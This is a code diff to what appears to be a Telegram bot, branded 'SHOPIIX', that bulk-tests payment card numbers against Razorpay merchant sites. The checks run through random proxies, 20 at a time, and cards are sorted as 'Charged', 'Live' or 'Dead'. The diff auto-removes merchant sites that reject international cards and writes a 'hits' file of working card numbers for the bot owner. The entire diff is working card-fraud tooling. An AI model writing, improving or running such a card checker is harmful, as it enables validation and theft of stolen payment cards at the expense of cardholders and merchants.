@@ -59,6 +59,16 @@ def _remove_user_rz_site(uid, idx):
         return removed
     return None
 
+def _remove_user_rz_site_by_url(uid, url):
+    sites = _rz_sites.get(uid, [])
+    if url in sites:
+        sites.remove(url)
+        _rz_data_cache.pop(url, None)
+        _rz_sites[uid] = sites
+        _save_rz_sites()
+        return True
+    return False
+
 def _normalize_url(url):
     url = url.strip().rstrip('/')
     if not url.startswith(('http://', 'https://')):
@@ -429,6 +439,8 @@ async def razorpay_check(card: str, site: str, site_data: dict, proxy_str=None):
                     ' Try another payment method or contact your bank for details.', '').strip()
                 reason  = err_obj.get('reason', '')
                 label   = f"{desc} ({reason})" if reason and reason not in desc else desc
+                if reason == 'international_transaction_not_allowed':
+                    return {'status': 'Dead', 'message': label or 'International not supported', 'card': card, 'site_invalid': True}
                 if any(k in desc.lower() for k in _LIVE_KEYWORDS) or reason in _LIVE_REASONS:
                     return {'status': 'Live', 'message': label or 'Live', 'card': card}
                 return {'status': 'Dead', 'message': label or 'Declined', 'card': card}
@@ -496,6 +508,8 @@ async def razorpay_check(card: str, site: str, site_data: dict, proxy_str=None):
                     ' Try another payment method or contact your bank for details.', '').strip()
                 c_reason = c_err.get('reason', '')
                 c_label  = f"{c_desc} ({c_reason})" if c_reason and c_reason not in c_desc else c_desc
+                if c_reason == 'international_transaction_not_allowed':
+                    return {'status': 'Dead', 'message': c_label or 'International not supported', 'card': card, 'site_invalid': True}
                 if any(k in c_desc.lower() for k in _LIVE_KEYWORDS) or c_reason in _LIVE_REASONS:
                     return {'status': 'Live', 'message': c_label or 'Live', 'card': card}
                 if c_label:
@@ -747,6 +761,11 @@ def register_handlers(bot, is_premium_fn, is_owner_fn, load_proxies_fn):
         status  = result['status']
         message = result['message']
 
+        site_removed_note = ''
+        if result.get('site_invalid'):
+            _remove_user_rz_site_by_url(user_id, site)
+            site_removed_note = f"\n🗑  <b>SITE AUTO-REMOVED</b>  ▸  International not supported"
+
         if status == 'Charged':
             s_emoji, s_text = '💎', '𝗖𝗛𝗔𝗥𝗚𝗘𝗗'
         elif status == 'Live':
@@ -763,7 +782,7 @@ def register_handlers(bot, is_premium_fn, is_owner_fn, load_proxies_fn):
             f"💳 <b>𝗖𝗔𝗥𝗗</b>   ▸  <code>{card}</code>\n"
             f"◈  <b>𝗥𝗘𝗦𝗣</b>   ▸  <i>{message[:120]}</i>\n"
             f"🌐 <b>𝗚𝗪</b>     ▸  Razorpay Charge\n"
-            f"⏱  <b>𝗧𝗜𝗠𝗘</b>  ▸  {elapsed}s\n\n"
+            f"⏱  <b>𝗧𝗜𝗠𝗘</b>  ▸  {elapsed}s{site_removed_note}\n\n"
             f'⚡ <b>𝗦𝗛𝗢𝗣𝗜𝗜𝗫</b>  ·  <a href="tg://user?id=5895386985">𝗔𝗶𝘇𝗲𝗻</a>',
             parse_mode='html'
         )
@@ -875,24 +894,37 @@ def register_handlers(bot, is_premium_fn, is_owner_fn, load_proxies_fn):
 
         semaphore     = asyncio.Semaphore(20)
         checked_count = [0]
+        removed_sites = set()
 
         async def _check_one(card, idx):
             if _stop[0]: return
             async with semaphore:
                 if _stop[0]: return
-                site  = random.choice(valid_sites)
-                info  = _rz_data_cache[site]
-                proxy = random.choice(proxies) if proxies else None
-                res   = await razorpay_check(card, site, info, proxy_str=proxy)
-                st    = res['status']
-                msg   = res['message']
-                if st == 'Charged': results['charged'].append(res)
-                elif st == 'Live':  results['live'].append(res)
-                elif st == 'Error': results['error'] += 1
-                else:               results['dead'].append(res)
-                checked_count[0] += 1
-                if checked_count[0] % 5 == 0 or checked_count[0] == total:
-                    await _update_prog(checked_count[0], card, msg)
+                try:
+                    if not valid_sites:
+                        results['error'] += 1
+                        checked_count[0] += 1
+                        return
+                    site  = random.choice(valid_sites)
+                    info  = _rz_data_cache[site]
+                    proxy = random.choice(proxies) if proxies else None
+                    res   = await razorpay_check(card, site, info, proxy_str=proxy)
+                    if res.get('site_invalid') and site not in removed_sites:
+                        removed_sites.add(site)
+                        _remove_user_rz_site_by_url(user_id, site)
+                        valid_sites[:] = [s for s in valid_sites if s != site]
+                    st    = res['status']
+                    msg   = res['message']
+                    if st == 'Charged': results['charged'].append(res)
+                    elif st == 'Live':  results['live'].append(res)
+                    elif st == 'Error': results['error'] += 1
+                    else:               results['dead'].append(res)
+                    checked_count[0] += 1
+                    if checked_count[0] % 5 == 0 or checked_count[0] == total:
+                        await _update_prog(checked_count[0], card, msg)
+                except Exception:
+                    results['error'] += 1
+                    checked_count[0] += 1
 
         await asyncio.gather(*[_check_one(c, i+1) for i, c in enumerate(cards)])
         bot.remove_event_handler(_stop_handler)
@@ -927,3 +959,35 @@ def register_handlers(bot, is_premium_fn, is_owner_fn, load_proxies_fn):
             await bot.edit_message(chat_id, prog_msg.id, summary, parse_mode='html')
         except Exception:
             await event.respond(summary, parse_mode='html')
+
+        # Send hits file to owner only
+        if is_owner_fn(user_id) and (results['charged'] or results['live']):
+            hits_path = f"rz_hits_{user_id}_{int(time.time())}.txt"
+            try:
+                async with aiofiles.open(hits_path, 'w') as hf:
+                    await hf.write(f"=== RAZORPAY CHARGE HITS | {time.strftime('%Y-%m-%d %H:%M:%S')} ===\n\n")
+                    if results['charged']:
+                        await hf.write(f"💎 CHARGED ({len(results['charged'])})\n")
+                        for r in results['charged']:
+                            await hf.write(f"{r['card']} | {r['message']}\n")
+                        await hf.write('\n')
+                    if results['live']:
+                        await hf.write(f"🔥 LIVE ({len(results['live'])})\n")
+                        for r in results['live']:
+                            await hf.write(f"{r['card']} | {r['message']}\n")
+                await bot.send_file(
+                    chat_id, hits_path,
+                    caption=(f"🎯 <b>Hits File</b>  ▸  {len(results['charged'])} Charged  +  {len(results['live'])} Live\n"
+                             f'⚡ <b>𝗦𝗛𝗢𝗣𝗜𝗜𝗫</b>  ·  <a href="tg://user?id=5895386985">𝗔𝗶𝘇𝗲𝗻</a>'),
+                    parse_mode='html'
+                )
+                os.remove(hits_path)
+            except Exception:
+                pass
+
+        if removed_sites:
+            await event.respond(
+                f"🗑  <b>AUTO-REMOVED</b>  ▸  {len(removed_sites)} site(s) (international not supported)\n"
+                + '\n'.join(f"❌ <code>{s}</code>" for s in removed_sites),
+                parse_mode='html'
+            )
